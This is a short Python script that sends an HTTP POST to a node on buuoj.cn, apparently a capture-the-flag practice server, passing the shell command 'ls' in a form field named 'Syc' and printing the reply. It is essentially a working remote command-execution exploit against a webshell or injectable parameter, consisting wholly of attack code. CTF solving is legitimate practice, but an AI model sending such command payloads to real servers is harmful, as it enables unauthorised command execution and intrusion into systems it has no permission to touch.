import requests

r = requests.post('http://ab111f19-9b58-44b5-868a-c8cb9dc45a61.node4.buuoj.cn:81/', data={'Syc': 'ls'})

print(r.content)
